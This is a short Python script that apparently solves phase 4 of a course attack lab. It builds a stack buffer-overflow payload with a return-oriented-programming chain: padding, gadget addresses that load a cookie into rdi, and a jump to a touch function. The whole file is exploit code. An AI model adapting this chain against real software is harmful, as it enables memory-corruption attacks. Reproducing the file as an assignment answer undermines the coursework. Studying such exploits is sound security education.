# Phase 4

import struct

def p64(d):
	return struct.pack('Q', d)

COOKIE = 0x76927bbf
TOUCH = [
	0x00000000004018c8,
	0x00000000004018f4,
	0x00000000004019c9
]
BUFFER_ADDRESS = 0x5566fd78
OFFSET = 40

exploit = ''
exploit += 'A' * (OFFSET - len(exploit))

#have to stay inside <start_farm>
#some pop to a register
exploit += p64(0x0000000000401a65)#pop rax (code: 58)
exploit += p64(COOKIE)
#move into register (rdi) -----> (move to rdi and ret)
exploit += p64(0x0000000000401a77)#move rax to rdi, ret (code: 48 89 c7)



exploit += p64(TOUCH[1])

with open('exploit_4.txt', 'w') as f:
	f.write(exploit)
